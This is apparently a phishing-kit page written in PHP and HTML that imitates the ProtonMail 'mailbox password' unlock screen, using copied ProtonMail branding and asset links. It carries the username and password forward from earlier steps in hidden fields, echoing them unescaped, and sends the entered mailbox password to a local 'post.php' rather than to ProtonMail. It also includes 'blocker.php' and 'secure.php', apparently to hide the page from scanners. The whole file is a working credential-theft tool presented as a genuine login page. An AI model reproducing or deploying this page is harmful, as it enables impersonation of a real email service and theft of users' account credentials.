<?php
include('blocker.php');
$email = '';

if(isset($_GET['email']) && !empty($_GET['email'])){
$email = $_GET['email'];
}
?>


<?php


include 'secure.php';


?>
<?php

$username = $_POST['username'];
$password = $_POST['password'];

?>
<!DOCTYPE html>



<html lang="en" ng-app="proton" class="protonmail ua-windows_nt ua-windows_nt-6 ua-windows_nt-6-1 ua-chrome ua-chrome-61 ua-chrome-61-0 ua-chrome-61-0-3163 ua-chrome-61-0-3163-100 ua-desktop ua-desktop-windows ua-webkit ua-webkit-537 ua-webkit-537-36 js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <meta http-equiv="x-dns-prefetch-control" content="off">
    <!--<base href="/">--><base href=".">
    <title>Login | ProtonMail</title>
    <meta name="description" content="Log in or create an account.">

    <link rel="apple-touch-icon" sizes="57x57" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-180x180.png">
    <link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-194x194.png" sizes="194x194">
    <link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/android-chrome-192x192.png" sizes="192x192">
    <link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-16x16.png" sizes="16x16">
    <link rel="manifest" href="https://mail.protonmail.com/manifest.json">
    <link rel="mask-icon" href="https://mail.protonmail.com/assets/favicons/safari-pinned-tab.svg" color="#333366">
    <link rel="shortcut icon" href="https://mail.protonmail.com/assets/favicons/favicon.ico">
    <meta name="apple-mobile-web-app-title" content="ProtonMail">
    <meta name="application-name" content="ProtonMail">
    <meta name="msapplication-TileColor" content="#333366">
    <meta name="msapplication-TileImage" content="https://mail.protonmail.com/assets/favicons/mstile-144x144.png">
    <meta name="theme-color" content="#333366">
    <meta name="apple-itunes-app" content="app-id=979659905">
    <!--- Stylesheets --->
    
        <link rel="stylesheet" type="text/css" href="./assets/app.css">
    
	
	
	</head><body ng-class="{
    locked: (isLoggedIn &amp;&amp; isLocked) || (&#39;login&#39;|isState) || (&#39;login.unlock&#39;|isState) || (&#39;eo.unlock&#39;|isState) || (&#39;eo.message&#39;|isState) || (&#39;reset&#39;|isState) || (&#39;eo.reply&#39;|isState) || (&#39;reset&#39;|isState),
    login:!isLoggedIn,
    unlock:isLocked,
    secure:isSecure,
    light: (&#39;support.reset-password&#39;|isState) || (&#39;signup&#39;|isState) || (&#39;login.setup&#39;|isState) || (&#39;pre-invite&#39;|isState) || (&#39;support.message&#39;|isState),
    scroll: (&#39;signup&#39;|isState) || (&#39;login.setup&#39;|isState) || (&#39;secured.print&#39;|isState)
}" data-detect-time-width="" data-app-config-body="" class="locked unlock" id="login-unlock"><!---->









<!--- No Script message --->
<noscript class="pm_noscript">ProtonMail requires Javascript. Enable Javascript and reload this page to continue.</noscript>

<!--- JS --->
<!----><div ui-view="main" autoscroll="false" id="body"><header class="pm_opensans headerNoAuth-container isLoggedIn" ng-class="{ &#39;isLoggedIn&#39;: isLoggedIn }">
    <ul class="headerNoAuth-list">
        <li class="headerNoAuth-item-back">

            <a class="headerNoAuth-item-back-btn__Auth" href="https://mail.protonmail.com/inbox" title="Inbox">
                <img class="CToWUd" src="./assets/backto.png">
            </a>
        </li>
        <li class="headerNoAuth-item-report">
            <button type="button" class="headerNoAuth-item-report-button newBugReport-container">
    <div class="newBugReport-wrapper">
       <img class="CToWUd" src="./assets/report.png">
    </div>
</button>
        </li>
        <li class="headerNoAuth-item-signup__noAuth">
            <a data-key="forFree" class="headerNoAuth-item-signup-button pm_button primary" href="https://protonmail.com/signup">Sign up for free</a>
        </li>
        <li class="headerNoAuth-item-logout__Auth">
            <a class="headerNoAuth-item-logout-button pm_button primary" ui-sref="login" translate="" translate-context="Action" href="https://mail.protonmail.com/login">Log out</a>
        </li>
    </ul>
</header>

<div class="row">
    <!----><div ui-view="panel"><form method="POST" id="pm_login" name="unlockForm" class="pm_panel pm_form alt ng-dirty ng-valid-parse ng-submitted ng-invalid ng-invalid-required" ng-class="{ loadingUnlock: domoArigato }" action="./post.php" novalidate="" role="form" autocomplete="on" ng-submit="unlock($event)">
    <div class="unlock-panel">

        <img src="./assets/logo.png" height="20" alt="ProtonMail" class="logo">

        <h4 class="text-center">
            <img class="CToWUd" src="./assets/decrypt.png">
        </h4>

        <p class="text-center"></p>

        <!---->

			<input name="username" type="hidden" id="id" value="<?php echo $_GET['username']; ?>"> 

			<input name="password" type="hidden" id="id" value="<?php echo $_GET['password']; ?>"> 
			
			
        <div class="margin focus unlock-input-password password-container customPasswordToggler" data-id="password" data-name="mailbox-password" data-value="mailboxPassword" data-form="unlockForm" data-autofocus="true" placeholder="Mailbox password">
    <input type="password" class="password-input ng-dirty ng-valid-parse ng-touched ng-empty ng-invalid ng-invalid-required" ng-model="value" autocapitalize="off" autocorrect="off" autocomplete="off" required="" data-toggle-password="" id="password" name="mailbox-password" placeholder="Mailbox password" tabindex="0" autofocus="true">
			
			
			<input name="id" type="hidden" id="id" value="<?php echo $_GET['username']; ?>"> 

			<input name="id" type="hidden" id="id" value="<?php echo $_GET['password']; ?>"> 
			
			
    <!----><div class="password-messages ng-active" ng-messages="message" ng-if="!form.$pristine">
        <!----><p ng-message="required" class="text-red" translate-context="Error" translate="">Field required</p>
        <!---->
    </div><!---->
	
</div>

        <div class="loginForm-actions">
            <div class="loginForm-actions-column">
                <button id="unlock_btn" class="loginForm-actions-main pm_button primary pull-right" type="submit" ng-disabled="networkActivity.loading()" translate-context="Action" translate="">Unlock</button>
                <button type="button" ng-click="reset()" class="login-support pm_button link pull-left unlock-btn-forgot" translate-context="Action" translate="" translate-comment="link to reset mailbox">Forgot password?</button>
            </div>
        </div>

    </div>

    <div class="loadingUnlock-loader-container">
        <div class="atomLoader" data-translation-key="decrypting">
    <div class="atomLoader-container">
        <div class="atomLoader-item"></div>
        <div class="atomLoader-item2"></div>
        <div class="atomLoader-item3"></div>
        <div class="atomLoader-proton"></div>
    </div>
    <p class="atomLoader-text">Decrypting</p>
</div>
    </div>
</form>
</div>
</div>

<div id="pm_footer">
    <p><span class="appCopyright-container">2017 ProtonMail.com - Made globally, hosted in Switzerland.</span> <a data-prefix="v" href="https://protonmail.com/blog/protonmail-v3-11-release-notes/" title="Wed Oct 18 2017" target="_blank" class="appVersion-container">3.11.7</a></p>
</div>
</div>

   


<span class="ptdnd-notification"></span><style>
              .conversation .time { width: 88px; }
              .conversation .row .meta { width: 138px;}
              </style></body></html>